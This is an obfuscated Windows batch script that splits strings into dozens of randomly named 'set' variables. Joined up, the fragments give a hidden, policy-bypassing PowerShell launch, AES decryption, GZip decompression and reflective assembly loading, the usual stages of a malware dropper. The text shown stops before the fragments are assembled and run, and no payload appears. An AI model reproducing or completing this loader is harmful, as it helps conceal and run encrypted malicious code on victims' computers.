@echo off
set "XmiNhharrE=he"
set "bCQxLJxJVd=rs"
set "dQvRyNzTno=we"
set "QEtRRhJchu=em"
set "KwXTkziRdL=.e"
set "BHrmmqTFEt=ws"
set "XwsguPjEqC=co"
set "RZsqHynxLn=\v"
set "dsWQhkZPaB= /"
set "NudUaUDCmp=32"
set "NPkzSYIbdB= C"
set "zkVboKchRF=xe"
set "TiMsTKlAOy=ll"
set "nJoIAXfDrj=Po"
set "UCGdfQTGgd=we"
set "RpaSBYMdCW=do"
set "nRCFEdvRPt=s\"
set "NiCIvDddWm=0\"
set "ujAylANAKp=he"
set "bYoPuXURfJ=po"
set "czLOmyTZNy=\W"
set "WRCawkCyCE=ll"
set "YlHMyilTov=nd"
set "sPYDRfjECp=st"
set "MPwQXmycnm=rS"
set "vlEYCArimo=Sy"
set "nKusJyDxwf=Wi"
set "ycpfmQIIKq=1."
set "hZgrtYmHoM=y "
set "giAPQuHYdF=ow"
set "sBIAjWeBDR=py"
set "TQpADQRMgv=in"
set "MYUKxEImZX=:\"
set "BBJtuBfqLa=cd"
set "qCjSgUNFRr= %~dp0"
set "CmbaqqEyIT=gMod"
set "SiDYtrzHvR=oryS"
set "YeKNFWURcr=mory"
set "EZVcCEqiHG=em.I"
set "ESQNrfexBK=se()"
set "BtuomdWVPx=HgE "
set "SyCdczMOqo=ose("
set "CxcuWaeDeq=eMVs"
set "ycZvGvkYFd=ck($"
set "IaDUNwqNfd=vert"
set "mECVPSKSAE=BC;$"
set "tlXOdGObpn=Disp"
set "WvAlSTiCXU=raph"
set "VlTfpKYSSe=Obje"
set "xRIxXSrUlG=tsWi"
set "kqFEtgjHLT=ress"
set "DxiEWLuexh='[-1"
set "uZoYNuZIlg= '')"
set "UErXRxhdUc=('%*'"
set "JyqiZboIAE=oL'["
set "aohxjFXLLZ=..-1"
set "WDDjQXOmRE=Secu"
set "SLhEOuhTNE=zuZI"
set "wqbGbiSQVj=O.Me"
set "NJwSpxYkgP=Star"
set "buYoZceTtL='txe"
set "JzgpqlBDse=b = "
set "iaJmXcayEA=ct S"
set "KiDTNzgFJf=$YxU"
set "xHecNuQdzW=]::("
set "jKxnhJDLVz=ose("
set "uKBEIovpXT=bypa"
set "YeQjbvmGKl=Syst"
set "pJrPkFgkUq=zHhH"
set "cXKVXkclwO=YxUp"
set "MbEBZjgxqd=stem"
set "DuKigLBMed=flec"
set "AJCdYJlCvQ=ispo"
set "kSzxHXbECn=rofi"
set "nMhiJgluIZ=v = "
set "sBttCtzaAo=join"
set "tTreqIYwOh=1] -"
set "KPQpfRLekt=ptor"
set "KBwqBayISZ=)))"
set "yRibXCEEdS=.Cop"
set "QHFxaOdMfO=esaB"
set "CqiGkTRGub=);$d"
set "ymlHKfboyY=stem"
set "HgcaBsnvpP=ddin"
set "jEQqzVqKiJ=Bmor"
set "irQqWgBYVV=V = "
set "tCtWLvbqVK=F'[-"
set "XeOhnDCkgj= = ["
set "ryGuGrYdGZ=::De"
set "PvYLDXAuKT=gsYZ"
set "JxsYwSGiyD=New-"
set "yAAyNWTYQj=tem."
set "WiYfPkZmTp=ect "
set "gBmJJJguie=] -j"
set "creQedHgWA=dAfB"
set "VlohehFzSx=..-1"
set "oAxMtNItas=XGc "
set "AGMcPUFCyM='[-1"
set "hzCRkzVUVv=Mode"
set "LnrEvQvqhU=.Com"
set "uTMIqpKqDw=BS.I"
set "TKIjOTznlN=Obje"
set "UYQUekYfCG=.Cry"
set "ZJKkvtHmiU=pher"
set "cxIOSLyomH=YxUp"
set "YCcxwKtKaz=NkDm"
set "zFCSUDRKjn=PxEW"
set "jDLmJyoEnG=yste"
set "aopRBDRArI=);$w"
set "aiZBmhBUMO=();$"
set "NDCWhleewg=ateD"
set "SmzVBcGqBE=1..-"
set "odQUUJhkvE=; };"
set "uCPHTnJmsV='0Pg"
set "anxfZTFezl=.Dis"
set "zQPUtlOKAP=ay()"
set "nazFzpKtAT=xWv."
set "fsnhaWeUOw=n ''"
set "aHcNSYbfSU=and "
set "ViOruUovVT=).Sp"
set "ENPzUSinIg=.GZi"
set "jLaJXaREKJ=QKUb"
set "uBhtrgIjSS=6esa"
set "cvUojtBWkE=($BZ"
set "ocQtZmEtuc=[]] "
set "RptHjarSQP= [Sy"
set "rRWKtYqEcD= New"
set "PaqlfvnwIf=xUpo"
set "wtEmwywFPV=trea"
set "IwWAugbrET=Syst"
set "QecAugXJdT=nage"
set "kjSZJeCkFY=urit"
set "xHiQZcAKcM=oArr"
set "prBAaePcRT=amXG"
set "fNFaBCoTsT=;$am"
set "chGOijoPAk== $d"
set "SrXUrUvNSK=TllA"
set "skwCEPVdAp=.Cre"
set "AovAHRahHA=po ="
set "TvnltifnTZ=tM);"
set "cxVXZbquXX=ionM"
set "VGCKzoTcHr=zixW"
set "vLWIrowOeu=bttM"
set "kpwLSqAfNt=ptog"
set "gOIexzAIuY=Conv"
set "RAHynKbiox=yste"
set "PGGgyQfmAF==');"
set "YKKmSOpNsj=;$kG"
set "tthndAKbza=orF'"
set "frjITITpLG= [Sy"
set "TTNxxqxueQ=xUpo"
set "EnrkadSrLu=QKUb"
set "qpTISGUnrO=ke($"
set "sBWenJbVcZ=$abt"
set "lQTsGSsZIs=pStr"
set "zaTdRaoGUv=$kGH"
set "cmOYYrUPle=pLUb"
set "ugMyRtaxxT=.Sec"
set "UQFnSIckiS=am;$"
set "hlKuLnmjSE=eam("
set "sWEiJtsoDH=Disp"
set "ClHbDOPphs=po);"
set "vRjZuifoFv=$abt"
set "XLBzQKacHm=ach "
set "pkOynXnWCl=Stre"
set "WnOsqWgSWk=yBUZ"
set "xiznQuSEmg=pres"
set "EqKdXbdriA=tem."
set "ngIKreotWi=gjYA"
set "olplwBWsSH=();$"
set "IumTVxOOvK== [S"
set "OMmFnZIpmc=.Con"
set "HKhifcrPun=rity"
set "gtDSUdqhDf=('da"
set "eQQFHKnEUV=tem."
set "pDRyPZeISX=File"
set "ORqbVznLhK= = $"
set "WjmpVSlDZv=gth)"
set "MMSIQknyhf=ypto"
set "vKCBDpIfwO=k; }"
set "DNKTLedOuj='gni"
set "tQiEOzUOVP=RmAx"
set "mzrTHKYvNX=($BZ"
set "PhGoGvYult=();$"
set "ezpaTOshfz=AfBS"
